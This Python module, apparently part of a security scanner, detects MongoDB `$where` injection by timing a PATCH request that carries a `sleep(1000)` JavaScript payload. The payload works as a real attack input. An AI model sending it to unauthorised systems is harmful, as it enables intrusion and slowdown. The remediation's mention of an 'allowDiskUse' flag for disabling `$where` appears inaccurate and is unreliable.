#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Injection: NoSQL `$where` operator triggers server-side time delay.

When MongoDB's `$where` operator reaches the database, attacker-
controlled JavaScript runs server-side. The classic safe-but-loud
proof is `sleep(N)` — observe the response time delta.

We compare ONE baseline call against ONE probe call. Sleep duration
is short (1.0 s) and the threshold is conservative; we report
inconclusive if either request is slow for unrelated reasons.

Detection signal:
  PATCH /rest/products/reviews with `{message: {$where: "sleep(1000)"}}`
  takes >= 800 ms; baseline same endpoint takes < 300 ms.
"""
from __future__ import annotations

import json
import sys
import time
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

REVIEWS_PATH = "/rest/products/reviews"
SLEEP_MS = 1000           # how long we ask the server to sleep
THRESHOLD_DELTA_MS = 700  # how much slower the probe must be vs baseline


class NosqlReviewDosWhereProbe(Probe):
    name = "nosql_review_dos_where"
    summary = ("Detects NoSQL `$where` server-side JS evaluation via "
               "a measurable time delay.")
    safety_class = "read-only"

    def add_args(self, parser):
        pass

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        url = urljoin(origin, REVIEWS_PATH)

        # Baseline: same endpoint, harmless body. We're measuring HTTP
        # round-trip + endpoint cost without the injected $where, so
        # `id` is a plausible string and `message` is a plain string.
        baseline_body = json.dumps({"id": "baseline-no-such-id",
                                    "message": "baseline"}).encode()
        t0 = time.monotonic()
        r0 = client.request("PATCH", url, headers={
            "Content-Type": "application/json"}, body=baseline_body)
        baseline_ms = int((time.monotonic() - t0) * 1000)

        probe_body = json.dumps({
            "id": "probe-no-such-id",
            "message": {"$where": f"sleep({SLEEP_MS})"},
        }).encode()
        t1 = time.monotonic()
        r1 = client.request("PATCH", url, headers={
            "Content-Type": "application/json"}, body=probe_body)
        probe_ms = int((time.monotonic() - t1) * 1000)

        delta = probe_ms - baseline_ms
        attempt = {"baseline_ms": baseline_ms,
                   "probe_ms":    probe_ms,
                   "delta_ms":    delta,
                   "baseline_status": r0.status,
                   "probe_status":    r1.status,
                   "sleep_ms":     SLEEP_MS,
                   "threshold_ms": THRESHOLD_DELTA_MS}
        evidence = {"origin": origin, "attempt": attempt}

        if delta >= THRESHOLD_DELTA_MS and probe_ms >= SLEEP_MS - 200:
            return Verdict(
                validated=True, confidence=0.9,
                summary=(f"Confirmed: `$where: sleep({SLEEP_MS})` on "
                         f"{url} delayed the response {delta} ms vs "
                         f"baseline ({baseline_ms} ms). Server is "
                         "evaluating attacker-controlled JavaScript."),
                evidence=evidence,
                severity_uplift="high",
                remediation=(
                    "Disable `$where` (and `$function`, `$accumulator`) "
                    "on the Mongo connection — the driver supports an "
                    "`allowDiskUse: false` style flag for this. Or "
                    "validate the `message` field as a string before "
                    "the query is built; refuse non-string types via "
                    "JSON schema."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: $where probe on {url} did not produce "
                     f"a measurable delay (baseline {baseline_ms} ms, "
                     f"probe {probe_ms} ms, delta {delta} ms)."),
            evidence=evidence,
        )


if __name__ == "__main__":
    NosqlReviewDosWhereProbe().main()
